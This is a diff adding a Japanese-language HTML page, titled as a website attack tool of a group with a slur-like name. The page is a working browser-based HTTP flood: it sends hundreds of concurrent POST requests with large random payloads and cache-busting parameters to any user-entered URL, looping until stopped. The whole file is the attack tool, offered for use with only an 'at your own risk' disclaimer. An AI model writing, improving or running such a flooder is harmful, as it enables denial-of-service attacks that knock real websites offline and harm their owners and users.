@@ -1,1 +1,147 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ガイジ海賊団　ウェブサイト攻撃ツール</title>
+  <style>
+    body { background:#111; color:#0f0; font-family:monospace; padding:10px; margin:0; }
+    h1 { font-size:1.3em; }
+    label { display:block; margin:10px 0 5px; }
+    input, button {
+      width: 100%; padding: 10px; margin-bottom: 10px;
+      font-size: 1em; background: #000; color: #0f0; border: 1px solid #0f0;
+    }
+    button:disabled { opacity: 0.4; }
+    #log {
+      background: #000; border: 1px solid #0f0;
+      height: 180px; overflow-y: scroll; white-space: pre-wrap; font-size: 0.85em; padding: 5px;
+    }
+    .stats { font-size: 0.9em; margin-top: 5px; }
+  </style>
+</head>
+<body>
 
+<h1>ガイジ海賊団　ウェブサイト攻撃ツール</h1>
+
+<label>ターゲットURL:
+  <input id="url" value="http://localhost/api/target">
+</label>
+<label>同時リクエスト数（300〜500推奨）:
+  <input id="concurrency" type="number" value="400" min="1" max="999">
+</label>
+<label>1リクエストあたりのペイロードKB（10〜100）:
+  <input id="payloadSize" type="number" value="50" min="1" max="200">
+</label>
+
+<button id="startBtn">▶ 攻撃開始</button>
+<button id="stopBtn" disabled>⏹ 停止</button>
+
+<div class="stats" id="stats">統計: --</div>
+<div id="log"></div>
+
+<script>
+(() => {
+  const urlInput = document.getElementById('url');
+  const concurrencyInput = document.getElementById('concurrency');
+  const payloadSizeInput = document.getElementById('payloadSize');
+  const logEl = document.getElementById('log');
+  const statsEl = document.getElementById('stats');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
+
+  let running = false;
+  let totalSent = 0;
+  let successCount = 0;
+  let failCount = 0;
+  let active = 0;
+
+  const logBuffer = [];
+  function appendLog(text) {
+    logBuffer.push(text);
+    if (logBuffer.length > 50) logBuffer.shift();
+    logEl.textContent = logBuffer.join('\n');
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function makePayload(sizeKB) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < sizeKB * 1024; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+  }
+
+  async function sendRequest(id, url, payload) {
+    if (!running) return;
+    try {
+      const res = await fetch(url + '?_=' + Date.now() + Math.random(), {
+        method: 'POST',
+        headers: { 'Content-Type': 'text/plain' },
+        body: payload,
+        cache: 'no-store'
+      });
+      if (res.ok) {
+        successCount++;
+      } else {
+        failCount++;
+        appendLog(`✖ HTTPエラー #${id} → ${res.status}`);
+      }
+    } catch (e) {
+      failCount++;
+      appendLog(`✖ 通信エラー #${id} ${e.message || e}`);
+    }
+    totalSent++;
+    active--;
+    updateStats();
+    if (running) loopFire(url, payload);
+  }
+
+  function updateStats() {
+    statsEl.textContent = `送信: ${totalSent}　成功: ${successCount}　失敗: ${failCount}　同時中: ${active}`;
+  }
+
+  function loopFire(url, payload) {
+    while (active < concurrencyInput.value && running) {
+      active++;
+      const id = totalSent + 1;
+      sendRequest(id, url, payload);
+    }
+  }
+
+  startBtn.onclick = () => {
+    const url = urlInput.value.trim();
+    const sizeKB = parseInt(payloadSizeInput.value, 10);
+    const payload = makePayload(sizeKB);
+
+    if (!url) return alert("URLを入力してください");
+
+    running = true;
+    totalSent = 0;
+    successCount = 0;
+    failCount = 0;
+    active = 0;
+    logBuffer.length = 0;
+    logEl.textContent = '';
+    updateStats();
+
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+
+    loopFire(url, payload);
+    appendLog(`▶ 攻撃開始: ${url} 同時数=${concurrencyInput.value} KB=${sizeKB}`);
+  };
+
+  stopBtn.onclick = () => {
+    running = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    appendLog('⏹ 攻撃停止');
+  };
+})();
+</script>
+
+</body>
+  <h1>※やるのは自己責任です</h1>
+</html>
